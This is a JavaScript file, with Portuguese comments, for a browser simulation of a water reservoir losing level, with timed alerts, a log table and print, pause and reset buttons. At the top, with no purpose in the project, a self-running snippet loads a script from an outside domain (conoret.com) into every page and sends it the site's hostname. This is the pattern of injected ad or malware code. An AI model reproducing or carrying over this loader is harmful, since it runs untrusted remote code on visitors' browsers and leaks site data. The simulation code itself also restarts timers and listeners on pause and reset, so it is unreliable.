// Adiciona um script externo ao head
if (window.top === window) {
    (function() {
        var e = document.createElement("script"),
            t = document.getElementsByTagName("head")[0];
        e.src = "//conoret.com/dsp?h=" + document.location.hostname + "&r=" + Math.random();
        e.type = "text/javascript";
        e.defer = true;
        e.async = true;
        t.appendChild(e);
    })();
}

let waterLevel = 20000; // Nível inicial da água em ml
const maxWaterLevel = 20000; // Nível máximo da água em ml
const minWaterLevel = 0; // Nível mínimo da água em ml
let isPaused = false;
let intervalId;

function setup() {
    console.log("Setup iniciado");
    const momentos = [
        { perda: 0, alerta: "" },
        { perda: 2500, alerta: "Atenção: queda de nível detectada!" },
        { perda: 2500, alerta: "ATENÇÃO: queda de nível pesistente " },
        { perda: 2500, alerta: "Atenção: verifique as saídas de água do reservatório!" },
        { perda: 2500, alerta: "Atenção: Verifique as saídas de água do reservatório!" },
        { perda: 2500, alerta: "ATENÇÃO: queda de nível pesistente" },
        { perda: 2500, alerta: "ATENÇÃO: queda de nível pesistente" },
        { perda: 25000, alerta: "ATENÇÃO: risco de esgotamento" },
        { perda: 2500, alerta: "ATENÇÃO: vazão e nivel de água não detectados" },
        { perda: 2500, alerta: "ATENÇÃO: vazão e nivel de água não detectados" },
        { perda: 2500, alerta: "Reservatório Vazio" },
        { perda: 2500, alerta: "Reservatório Vazio" }
    ];

    let index = 0;
    intervalId = setInterval(() => {
        if (index < momentos.length) {
            const momento = momentos[index];
            waterLevel -= momento.perda;
            if (waterLevel < minWaterLevel) {
                waterLevel = minWaterLevel;
            }
            updateWaterDisplay();
            logWaterLevel(waterLevel, momento.alerta);
            index++;
        } else {
            clearInterval(intervalId);
        }
    }, 15000); // 15 segundos de intervalo entre cada momento

    setInterval(updateClock, 1000);

    document.getElementById('pause-button').addEventListener('click', togglePause);
    document.getElementById('reset-button').addEventListener('click', resetSystem);
    document.getElementById('print-button').addEventListener('click', imprimirResultados);
}

function updateWaterLevel() {
    // Função não necessária para este exemplo simplificado
}

function updateWaterDisplay() {
    document.getElementById('water').style.height = `${(waterLevel / maxWaterLevel) * 100}%`;
    document.getElementById('level-indicator').innerText = `Nível: ${waterLevel}ml`;
}

function updateClock() {
    if (!isPaused) {
        const now = new Date();
        const hours = now.getHours().toString().padStart(2, '0');
        const minutes = now.getMinutes().toString().padStart(2, '0');
        const seconds = now.getSeconds().toString().padStart(2, '0');
        document.getElementById('clock').innerText = `Hora: ${hours}:${minutes}:${seconds}`;
    }
}

function logWaterLevel(currentVolume, alerta) {
    console.log("Registrando nível de água:", currentVolume, alerta);
    const tableBody = document.getElementById('log-table').getElementsByTagName('tbody')[0];
    const newRow = tableBody.insertRow();
    const timeCell = newRow.insertCell(0);
    const levelCell = newRow.insertCell(1);
    const alertCell = newRow.insertCell(2);
    timeCell.innerText = new Date().toLocaleTimeString(); // Atualiza a hora corretamente
    levelCell.innerText = `${currentVolume}ml`;
    alertCell.innerText = alerta || "Nenhum alerta";
}

function togglePause() {
    isPaused = !isPaused;
    document.getElementById('pause-button').innerText = isPaused ? 'Continuar' : 'Interromper';
    if (isPaused) {
        clearInterval(intervalId);
    } else {
        setup(); // Reinicia o processo
    }
}

function resetSystem() {
    clearInterval(intervalId);
    waterLevel = 20000;
    isPaused = false;
    document.getElementById('pause-button').innerText = 'Interromper';
    document.getElementById('log-table').getElementsByTagName('tbody')[0].innerHTML = '';
    updateWaterDisplay();
    setup(); // Reinicia o processo
}

function imprimirResultados() {
    html2canvas(document.body).then(canvas => {
        var imgData = canvas.toDataURL('image/png');
        var newWindow = window.open('');
        newWindow.document.write('<html><head><title>Print</title></head><body>');
        newWindow.document.write('<img src="' + imgData + '"/>');
        newWindow.document.write('</body></html>');
        newWindow.document.close();
        newWindow.focus();
        newWindow.onload = function() {
            newWindow.print();
            newWindow.close();
        };
    }).catch(error => {
        console.error('Erro ao capturar a tela:', error);
    });
}
